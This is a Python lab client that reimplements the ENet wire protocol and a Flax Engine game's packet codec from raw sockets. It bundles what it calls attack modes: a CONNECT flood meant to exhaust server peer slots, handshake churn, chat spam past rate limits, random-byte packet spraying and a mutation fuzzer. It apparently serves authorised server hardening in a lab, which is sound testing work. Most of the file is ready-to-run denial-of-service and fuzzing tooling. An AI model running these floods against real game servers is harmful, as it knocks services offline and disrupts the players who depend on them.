#!/usr/bin/env python3
"""
flax_enet.py - standalone ENet protocol client for the Flax Engine game server lab.

Reimplements the ENet wire protocol (as vendored by Flax 1.12, Source/ThirdParty/enet)
from the raw socket up, plus the game's NetworkMessage codec (packet ids 1-8, 200),
so attacks can be run with ZERO Flax/engine code on the client side.

Wire reference: docs/WIRE-FORMAT.md

Usage examples:
  python flax_enet.py --mode connect --username Tester                 # baseline handshake + auth
  python flax_enet.py --mode craft --username A --payload-hex 0100..   # send raw payload after connect
  python flax_enet.py --mode flood-connect --count 5000                # CONNECT flood, no handshake
  python flax_enet.py --mode flood-request --count 200                 # connect+request churn
  python flax_enet.py --mode chat-flood --count 100                    # chat spam past rate limit
  python flax_enet.py --mode fuzz --seed 7 --count 1000                # mutate a valid request
  python flax_enet.py --mode packet-soup --count 2000                  # random bytes at server
"""

import argparse
import random
import socket
import struct
import sys
import time

# ---------------------------------------------------------------------------
# ENet constants (Flax 1.12 vendored ENet)
# ---------------------------------------------------------------------------
CMD_ACKNOWLEDGE = 1
CMD_CONNECT = 2
CMD_VERIFY_CONNECT = 3
CMD_DISCONNECT = 4
CMD_PING = 5
CMD_SEND_RELIABLE = 6
CMD_SEND_UNRELIABLE = 7
CMD_SEND_FRAGMENT = 8
CMD_SEND_UNSEQUENCED = 9
CMD_BANDWIDTH_LIMIT = 10
CMD_THROTTLE_CONFIGURE = 11

CMD_FLAG_ACKNOWLEDGE = 0x80
CMD_FLAG_UNSEQUENCED = 0x40
CMD_MASK = 0x0F

HDR_FLAG_SENT_TIME = 1 << 15
HDR_FLAG_COMPRESSED = 1 << 14
HDR_SESSION_MASK = 3 << 12
HDR_SESSION_SHIFT = 12
PEER_ID_MASK = 0x0FFF

CHANNEL_CONTROL = 0xFF

# Flax ENet config (ENetDriver.cpp): 1 channel, no compression, no checksum
CHANNEL_COUNT = 1
MTU = 1400
WINDOW_SIZE = 65536
THROTTLE_INTERVAL = 5000
THROTTLE_ACCEL = 2
THROTTLE_DECEL = 2

# Game packet ids (NetworkPackets.cs)
PID_CONNECTION_REQUEST = 1
PID_CONNECTION_RESPONSE = 2
PID_PLAYER_LIST = 3
PID_PLAYER_CONNECTED = 4
PID_PLAYER_DISCONNECTED = 5
PID_PLAYER_TRANSFORM = 6
PID_PLAYERS_TRANSFORM = 7
PID_CHAT_MESSAGE = 8
PID_COMBAT = 200

MAX_TOKEN_BYTES = 1024

PACKET_NAMES = {
    1: "ConnectionRequest", 2: "ConnectionResponse", 3: "PlayerList",
    4: "PlayerConnected", 5: "PlayerDisconnected", 6: "PlayerTransform",
    7: "PlayersTransform", 8: "ChatMessage", 200: "CombatEvent",
}

# ---------------------------------------------------------------------------
# NetworkMessage codec (Flax: all primitives little-endian raw;
# string = u16le char count + UTF-16LE bytes; guid = 16 raw bytes)
# ---------------------------------------------------------------------------

def enc_str(s: str) -> bytes:
    if len(s) > 0xFFFF:
        s = s[:0xFFFF]
    return struct.pack("<H", len(s)) + s.encode("utf-16-le")


def dec_str(buf: bytes, off: int):
    (n,) = struct.unpack_from("<H", buf, off)
    off += 2
    return buf[off:off + n * 2].decode("utf-16-le", errors="replace"), off + n * 2


def enc_guid(g: str) -> bytes:
    """Encode a guid string as the engine puts it on the wire: .NET memory
    layout = u32 LE + u16 LE + u16 LE + 8 raw bytes (see docs/WIRE-FORMAT.md)."""
    b = bytes.fromhex(g.replace("-", ""))
    return (struct.pack("<I", int.from_bytes(b[0:4], "big")) +
            struct.pack("<H", int.from_bytes(b[4:6], "big")) +
            struct.pack("<H", int.from_bytes(b[6:8], "big")) +
            b[8:16])


def fmt_guid(b: bytes) -> str:
    a, b1, c = struct.unpack_from("<IHH", b, 0)
    return f"{a:08x}-{b1:04x}-{c:04x}-{b[8:10].hex()}-{b[10:16].hex()}"


def encode_game_packet(pkt_id: int, fields: list) -> bytes:
    """Encode a game packet from a field spec list. Supported field types:
    ('u8', int), ('i32', int), ('str', str), ('guid', hex-str), ('bool', bool),
    ('f32', float), ('bytes', bytes). First byte is always the packet id."""
    out = bytearray([pkt_id])
    for kind, val in fields:
        if kind == "u8":
            out += struct.pack("<B", val & 0xFF)
        elif kind == "i32":
            out += struct.pack("<i", val)
        elif kind == "f32":
            out += struct.pack("<f", val)
        elif kind == "str":
            out += enc_str(val)
        elif kind == "guid":
            out += enc_guid(val)
        elif kind == "bool":
            out += b"\x01" if val else b"\x00"
        elif kind == "bytes":
            out += val
        else:
            raise ValueError(f"unknown field type {kind}")
    return bytes(out)


def parse_game_packet(buf: bytes):
    """Best-effort decode of a game message body. Returns (id, summary-dict)."""
    if not buf:
        return None, {}
    pkt = buf[0]
    try:
        if pkt == PID_CONNECTION_REQUEST:
            u, off = dec_str(buf, 1)
            (tlen,) = struct.unpack_from("<i", buf, off)
            off += 4
            return pkt, {"username": u, "token_len": tlen, "token": buf[off:off + tlen].hex()[:64]}
        if pkt == PID_CONNECTION_RESPONSE:
            (state,) = struct.unpack_from("<B", buf, 1)
            g = fmt_guid(buf[2:18]) if len(buf) >= 18 else "?"
            return pkt, {"state": "Accepted" if state == 0 else "Rejected", "id": g}
        if pkt == PID_PLAYER_LIST:
            (n,) = struct.unpack_from("<i", buf, 1)
            off = 5
            players = []
            for _ in range(max(0, min(n, 64))):
                name, off = dec_str(buf, off)
                if off + 16 > len(buf):
                    break
                g = fmt_guid(buf[off:off + 16])
                off += 16
                players.append(f"{name}@{g[:8]}")
            return pkt, {"count": n, "players": players, "truncated": n > 64}
        if pkt == PID_PLAYER_CONNECTED:
            g = fmt_guid(buf[1:17])
            u, _ = dec_str(buf, 17)
            return pkt, {"id": g, "username": u}
        if pkt == PID_PLAYER_DISCONNECTED:
            return pkt, {"id": fmt_guid(buf[1:17])}
        if pkt == PID_PLAYERS_TRANSFORM:
            (n,) = struct.unpack_from("<i", buf, 1)
            return pkt, {"count": n, "bytes_per_entry": 44}
        if pkt == PID_CHAT_MESSAGE:
            m, off = dec_str(buf, 1)
            (has_sender,) = struct.unpack_from("<B", buf, off)
            off += 1
            sender = fmt_guid(buf[off:off + 16]) if has_sender and off + 16 <= len(buf) else ""
            return pkt, {"message": m[:120], "has_sender": has_sender, "sender": sender}
        if pkt == PID_COMBAT:
            return pkt, {
                "event": buf[1], "attacker": struct.unpack_from("<i", buf, 2)[0],
                "target": struct.unpack_from("<i", buf, 6)[0],
                "damage": struct.unpack_from("<f", buf, 10)[0],
            }
        return pkt, {"raw": buf[1:].hex()[:120]}
    except (struct.error, IndexError) as e:
        return pkt, {"parse_error": str(e), "raw": buf[1:].hex()[:120]}


def build_connection_request(username: str, token: bytes = b"") -> bytes:
    return encode_game_packet(PID_CONNECTION_REQUEST, [
        ("str", username), ("i32", len(token)), ("bytes", token[:MAX_TOKEN_BYTES])])


def build_chat_message(msg: str, sender_guid: str = "") -> bytes:
    fields = [("str", msg)]
    if sender_guid:
        fields += [("bool", True), ("guid", sender_guid)]
    else:
        fields += [("bool", False)]
    return encode_game_packet(PID_CHAT_MESSAGE, fields)


# ---------------------------------------------------------------------------
# ENet framing
# ---------------------------------------------------------------------------

def enet_header(peer_id: int, sent_time: int = 0, compressed: bool = False) -> bytes:
    flags = 0
    if compressed:
        flags |= HDR_FLAG_COMPRESSED
    if sent_time:
        flags |= HDR_FLAG_SENT_TIME
    out = struct.pack(">H", (flags | peer_id) & 0xFFFF)
    if sent_time:
        out += struct.pack(">H", sent_time)
    return out


def cmd_header(cmd: int, channel: int, seq: int) -> bytes:
    return bytes([cmd, channel]) + struct.pack(">H", seq & 0xFFFF)


def build_connect(connect_id: int) -> bytes:
    out = enet_header(0)
    out += cmd_header(CMD_CONNECT | CMD_FLAG_ACKNOWLEDGE, CHANNEL_CONTROL, 1)
    out += struct.pack(">H", 0)          # outgoingPeerID (client's incomingPeerID = 0)
    out += bytes([0, 0])                 # incoming/outgoing session id
    out += struct.pack(">I", MTU)
    out += struct.pack(">I", WINDOW_SIZE)
    out += struct.pack(">I", CHANNEL_COUNT)
    out += struct.pack(">I", 0)          # incoming bandwidth
    out += struct.pack(">I", 0)          # outgoing bandwidth
    out += struct.pack(">I", THROTTLE_INTERVAL)
    out += struct.pack(">I", THROTTLE_ACCEL)
    out += struct.pack(">I", THROTTLE_DECEL)
    out += struct.pack(">I", connect_id)
    out += struct.pack(">I", 0)          # data
    return out


def build_ack(channel: int, acked_seq: int) -> bytes:
    """ACK command body (header added by EnetClient.send_packet)."""
    out = bytes([CMD_ACKNOWLEDGE, channel]) + struct.pack(">H", acked_seq & 0xFFFF)
    out += struct.pack(">H", acked_seq & 0xFFFF)  # receivedReliableSequenceNumber
    out += struct.pack(">H", 0)                  # receivedSentTime
    return out


def build_send_reliable(payload: bytes, seq: int) -> bytes:
    out = enet_header(0)
    out += cmd_header(CMD_SEND_RELIABLE | CMD_FLAG_ACKNOWLEDGE, 0, seq)
    out += struct.pack(">H", len(payload))
    out += payload
    return out


def build_send_unreliable(payload: bytes, seq: int, rel_seq: int = 0) -> bytes:
    out = enet_header(0)
    out += cmd_header(CMD_SEND_UNRELIABLE, 0, rel_seq)
    out += struct.pack(">H", seq)        # unreliableSequenceNumber
    out += struct.pack(">H", len(payload))
    out += payload
    return out


def parse_datagram(buf: bytes):
    """Parse an ENet datagram. Returns (peer_id, session, sent_time, [commands]).
    Each command is (id, channel, seq, payload_or_None)."""
    if len(buf) < 2:
        return None
    (p16,) = struct.unpack_from(">H", buf, 0)
    off = 2
    sent_time = None
    if p16 & HDR_FLAG_SENT_TIME:
        if len(buf) < off + 2:
            return None
        (sent_time,) = struct.unpack_from(">H", buf, off)
        off += 2
    peer_id = p16 & PEER_ID_MASK
    session = (p16 & HDR_SESSION_MASK) >> HDR_SESSION_SHIFT
    commands = []
    while off + 4 <= len(buf):
        cmd, channel = buf[off], buf[off + 1]
        (seq,) = struct.unpack_from(">H", buf, off + 2)
        off += 4
        cid = cmd & CMD_MASK
        if cid == CMD_ACKNOWLEDGE:
            if off + 4 > len(buf):
                break
            (acked_seq,) = struct.unpack_from(">H", buf, off)
            commands.append((cid, channel, seq, {"acked_seq": acked_seq, "sent_time": struct.unpack_from(">H", buf, off + 2)[0]}))
            off += 4
        elif cid == CMD_CONNECT:
            if off + 44 > len(buf):
                break
            body = buf[off:off + 44]
            commands.append((cid, channel, seq, {
                "outgoing_peer": struct.unpack_from(">H", body, 0)[0],
                "session": (body[2], body[3]),
                "mtu": struct.unpack_from(">I", body, 4)[0],
                "window": struct.unpack_from(">I", body, 8)[0],
                "channels": struct.unpack_from(">I", body, 12)[0],
                "connect_id": struct.unpack_from(">I", body, 36)[0],
            }))
            off += 44
        elif cid == CMD_VERIFY_CONNECT:
            if off + 40 > len(buf):
                break
            body = buf[off:off + 40]
            commands.append((cid, channel, seq, {
                "outgoing_peer": struct.unpack_from(">H", body, 0)[0],
                "session": (body[2], body[3]),
                "mtu": struct.unpack_from(">I", body, 4)[0],
                "window": struct.unpack_from(">I", body, 8)[0],
                "channels": struct.unpack_from(">I", body, 12)[0],
                "connect_id": struct.unpack_from(">I", body, 36)[0],
            }))
            off += 40
        elif cid == CMD_DISCONNECT:
            commands.append((cid, channel, seq, {"data": None}))
        elif cid == CMD_PING:
            commands.append((cid, channel, seq, None))
        elif cid == CMD_SEND_RELIABLE:
            if off + 2 > len(buf):
                break
            (dlen,) = struct.unpack_from(">H", buf, off)
            off += 2
            payload = buf[off:off + dlen]
            commands.append((cid, channel, seq, payload))
            off += dlen
        elif cid == CMD_SEND_UNRELIABLE:
            if off + 4 > len(buf):
                break
            (useq,) = struct.unpack_from(">H", buf, off)
            (dlen,) = struct.unpack_from(">H", buf, off + 2)
            off += 4
            payload = buf[off:off + dlen]
            commands.append((cid, channel, seq, {"unreliable_seq": useq, "data": payload}))
            off += dlen
        elif cid == CMD_SEND_UNSEQUENCED:
            if off + 4 > len(buf):
                break
            (group,) = struct.unpack_from(">H", buf, off)
            (dlen,) = struct.unpack_from(">H", buf, off + 2)
            off += 4
            payload = buf[off:off + dlen]
            commands.append((cid, channel, seq, {"group": group, "data": payload}))
            off += dlen
        elif cid == CMD_SEND_FRAGMENT:
            if off + 20 > len(buf):
                break
            body = buf[off:off + 20]
            commands.append((cid, channel, seq, {
                "start_seq": struct.unpack_from(">H", body, 0)[0],
                "data_len": struct.unpack_from(">H", body, 2)[0],
                "frag_count": struct.unpack_from(">I", body, 4)[0],
                "frag_num": struct.unpack_from(">I", body, 8)[0],
                "total_len": struct.unpack_from(">I", body, 12)[0],
                "frag_offset": struct.unpack_from(">I", body, 16)[0],
                "fragment": body[20:20 + struct.unpack_from(">H", body, 2)[0]],
            }))
            off += 20 + struct.unpack_from(">H", body, 2)[0]
        elif cid == CMD_BANDWIDTH_LIMIT:
            if off + 8 > len(buf):
                break
            off += 8
        elif cid == CMD_THROTTLE_CONFIGURE:
            if off + 12 > len(buf):
                break
            off += 12
        else:
            break  # unknown command - stop parsing
    return peer_id, session, sent_time, commands


# ---------------------------------------------------------------------------
# Client
# ---------------------------------------------------------------------------

class EnetClient:
    def __init__(self, host: str, port: int, timeout: float = 4.0):
        self.addr = (host, port)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(timeout)
        self.connect_id = random.getrandbits(32)
        self.state = "idle"
        self.outgoing_peer = 0
        self.outgoing_session = 0
        self.rel_seq = 0          # channel-0 reliable seq (starts at 0, first send = 1)
        self.unrel_seq = 0
        self.acked_seq = set()

    # -- low level ---------------------------------------------------------

    def send_raw(self, datagram: bytes):
        self.sock.sendto(datagram, self.addr)

    def header_for(self) -> bytes:
        peer_id = (self.outgoing_session << 12) | (self.outgoing_peer & PEER_ID_MASK)
        return enet_header(peer_id)

    def send_packet(self, datagram_body: bytes):
        """Prepend the correct header (body = commands without header)."""
        self.send_raw(self.header_for() + datagram_body)

    def recv(self) -> list:
        """Receive one datagram, return parsed commands."""
        data, _ = self.sock.recvfrom(65535)
        parsed = parse_datagram(data)
        if parsed is None:
            return []
        _, _, _, commands = parsed
        return commands

    def pump(self, seconds: float = 0.25) -> list:
        """Drain datagrams for up to `seconds`, handling ACKs. Returns seen commands."""
        seen = []
        deadline = time.monotonic() + seconds
        while time.monotonic() < deadline:
            try:
                self.sock.settimeout(max(0.01, deadline - time.monotonic()))
                data, _ = self.sock.recvfrom(65535)
            except socket.timeout:
                break
            parsed = parse_datagram(data)
            if parsed is None:
                continue
            _, _, _, commands = parsed
            for c in commands:
                cid, channel, seq, payload = c
                if cid == CMD_SEND_RELIABLE and channel == 0 and seq not in self.acked_seq:
                    self.acked_seq.add(seq)
                    self.send_packet(build_ack(0, seq))
                seen.append(c)
        return seen

    # -- handshake ---------------------------------------------------------

    def connect(self) -> bool:
        self.send_raw(build_connect(self.connect_id))
        self.state = "connecting"
        deadline = time.monotonic() + 4.0
        while time.monotonic() < deadline:
            try:
                self.sock.settimeout(0.5)
                data, _ = self.sock.recvfrom(65535)
            except socket.timeout:
                continue
            except OSError:
                return False
            parsed = parse_datagram(data)
            if parsed is None:
                continue
            _, _, _, commands = parsed
            for c in commands:
                cid, channel, seq, payload = c
                if cid == CMD_VERIFY_CONNECT:
                    v = payload
                    if v["connect_id"] != self.connect_id:
                        continue
                    self.outgoing_peer = v["outgoing_peer"]
                    self.outgoing_session = v["session"][1]
                    # ACK the VERIFY_CONNECT - REQUIRED or server stays unconnected
                    self.send_packet(build_ack(CHANNEL_CONTROL, seq))
                    self.state = "connected"
                    return True
        return False

    def disconnect(self):
        try:
            self.send_packet(bytes([CMD_DISCONNECT, CHANNEL_CONTROL]) + struct.pack(">H", self.rel_seq) + struct.pack(">I", 0))
        except OSError:
            pass
        self.state = "disconnected"
        self.sock.close()

    # -- send --------------------------------------------------------------

    def send_reliable(self, payload: bytes) -> int:
        self.rel_seq += 1
        body = cmd_header(CMD_SEND_RELIABLE | CMD_FLAG_ACKNOWLEDGE, 0, self.rel_seq)
        body += struct.pack(">H", len(payload)) + payload
        self.send_packet(body)
        return self.rel_seq

    def send_unreliable(self, payload: bytes) -> int:
        self.unrel_seq += 1
        body = cmd_header(CMD_SEND_UNRELIABLE, 0, self.rel_seq)
        body += struct.pack(">H", self.unrel_seq) + struct.pack(">H", len(payload)) + payload
        self.send_packet(body)
        return self.unrel_seq

    def handshake_and_authenticate(self, username: str, token: bytes = b"", expect_response: bool = True):
        if not self.connect():
            print("[!] handshake failed: no VERIFY_CONNECT")
            return False
        print(f"[+] connected. client id={self.outgoing_peer} session={self.outgoing_session}")
        self.send_reliable(build_connection_request(username, token))
        print(f"[+] ConnectionRequest sent (username={username!r}, token={len(token)}B)")
        if expect_response:
            seen = self.pump(1.0)
            for c in seen:
                if c[0] == CMD_SEND_RELIABLE and c[1] == 0 and c[3]:
                    pkt, info = parse_game_packet(c[3])
                    print(f"[<-] game packet {PACKET_NAMES.get(pkt, pkt)}: {info}")
        return True


# ---------------------------------------------------------------------------
# Attack modes
# ---------------------------------------------------------------------------

def mode_connect(args):
    c = EnetClient(args.host, args.port)
    ok = c.handshake_and_authenticate(args.username, bytes.fromhex(args.token_hex) if args.token_hex else b"")
    c.disconnect()
    sys.exit(0 if ok else 1)


def mode_craft(args):
    c = EnetClient(args.host, args.port)
    if not c.handshake_and_authenticate(args.username, bytes.fromhex(args.token_hex) if args.token_hex else b""):
        sys.exit(1)
    payload = bytes.fromhex(args.payload_hex)
    print(f"[>] sending raw payload ({len(payload)}B): {payload.hex()[:200]}")
    c.send_reliable(payload)
    for _ in range(3):
        seen = c.pump(0.5)
        for cmd in seen:
            if cmd[0] == CMD_SEND_RELIABLE and cmd[1] == 0 and cmd[3]:
                pkt, info = parse_game_packet(cmd[3])
                print(f"[<-] game packet {PACKET_NAMES.get(pkt, pkt)}: {info}")
    c.disconnect()


def mode_packet_soup(args):
    c = EnetClient(args.host, args.port)
    if not c.connect():
        sys.exit(1)
    n = 0
    t0 = time.monotonic()
    for _ in range(args.count):
        length = random.randint(1, 256)
        payload = bytes(random.getrandbits(8) for _ in range(length))
        c.send_reliable(payload)
        n += 1
    print(f"[>] sent {n} random payloads in {time.monotonic() - t0:.2f}s")
    time.sleep(0.3)
    c.disconnect()


def mode_flood_connect(args):
    """Raw CONNECT floods - no handshake completion. Server allocs peers per datagram."""
    c = EnetClient(args.host, args.port)
    n = 0
    t0 = time.monotonic()
    while n < args.count:
        c.send_raw(build_connect(random.getrandbits(32)))
        n += 1
    dt = time.monotonic() - t0
    print(f"[>] sent {n} CONNECT datagrams in {dt:.2f}s ({n / dt:.0f}/s)")
    c.sock.close()


def mode_flood_request(args):
    """Full handshake + ConnectionRequest, then disconnect. Tests handshake-rate limits."""
    n = 0
    t0 = time.monotonic()
    while n < args.count:
        c = EnetClient(args.host, args.port)
        if c.connect():
            c.send_reliable(build_connection_request(args.username + str(n % 100), b""))
            c.pump(0.05)
        c.disconnect()
        n += 1
    dt = time.monotonic() - t0
    print(f"[>] {n} handshakes+requests in {dt:.2f}s ({n / dt:.1f}/s)")


def mode_chat_flood(args):
    c = EnetClient(args.host, args.port)
    if not c.connect():
        sys.exit(1)
    c.send_reliable(build_connection_request(args.username))
    seen = c.pump(0.5)
    own_guid = ""
    for cmd in seen:
        if cmd[0] == CMD_SEND_RELIABLE and cmd[1] == 0 and cmd[3] and cmd[3][0] == PID_CONNECTION_RESPONSE:
            _, info = parse_game_packet(cmd[3])
            own_guid = info["id"]
    if not own_guid:
        print("[!] no ConnectionResponse - server may not relay chats")
    msg = ("x" * 200)
    t0 = time.monotonic()
    for i in range(args.count):
        c.send_reliable(build_chat_message(msg, own_guid))
        if i % 10 == 0:
            c.pump(0.01)
    print(f"[>] {args.count} chat messages in {time.monotonic() - t0:.2f}s")
    seen = c.pump(0.5)
    echoes = sum(1 for s in seen if s[0] == CMD_SEND_RELIABLE and s[1] == 0 and s[3] and s[3][0] == PID_CHAT_MESSAGE)
    print(f"[<-] chat echoes received back: {echoes}")
    c.disconnect()


def mode_fuzz(args):
    """Mutate a valid ConnectionRequest payload and send each variant reliably."""
    seed = [
        struct.pack("<B", PID_CONNECTION_REQUEST) + enc_str(args.username) + struct.pack("<i", 0),
        struct.pack("<B", PID_CHAT_MESSAGE) + enc_str("hello") + b"\x00",
        struct.pack("<B", PID_PLAYERS_TRANSFORM) + struct.pack("<i", 4) + b"\x00" * (44 * 4),
    ]
    rng = random.Random(args.seed)
    c = EnetClient(args.host, args.port)
    if not c.connect():
        sys.exit(1)
    n = 0
    t0 = time.monotonic()
    for i in range(args.count):
        base = seed[i % len(seed)]
        b = bytearray(base)
        for _ in range(rng.randint(1, 4)):
            op = rng.randrange(3)
            if op == 0 and len(b) > 1:
                b[rng.randrange(len(b))] = rng.getrandbits(8)
            elif op == 1:
                b.insert(rng.randrange(len(b) + 1), rng.getrandbits(8))
            elif len(b) > 2:
                del b[rng.randrange(len(b))]
        if rng.random() < 0.15 and len(b) > 8:
            b = b[: rng.randint(1, len(b))]
        c.send_reliable(bytes(b))
        n += 1
    print(f"[>] sent {n} mutated payloads in {time.monotonic() - t0:.2f}s")
    time.sleep(0.4)
    c.disconnect()


def main():
    ap = argparse.ArgumentParser(description="Flax ENet lab client")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=7777)
    ap.add_argument("--mode", default="connect",
                    choices=["connect", "craft", "packet-soup", "flood-connect",
                             "flood-request", "chat-flood", "fuzz"])
    ap.add_argument("--username", default="LabTester")
    ap.add_argument("--token-hex", default="")
    ap.add_argument("--payload-hex", default="")
    ap.add_argument("--count", type=int, default=100)
    ap.add_argument("--seed", type=int, default=7)
    args = ap.parse_args()

    print(f"[*] flax_enet lab client -> {args.host}:{args.port} mode={args.mode}")
    if args.mode == "connect":
        mode_connect(args)
    elif args.mode == "craft":
        mode_craft(args)
    elif args.mode == "packet-soup":
        mode_packet_soup(args)
    elif args.mode == "flood-connect":
        mode_flood_connect(args)
    elif args.mode == "flood-request":
        mode_flood_request(args)
    elif args.mode == "chat-flood":
        mode_chat_flood(args)
    elif args.mode == "fuzz":
        mode_fuzz(args)


if __name__ == "__main__":
    main()
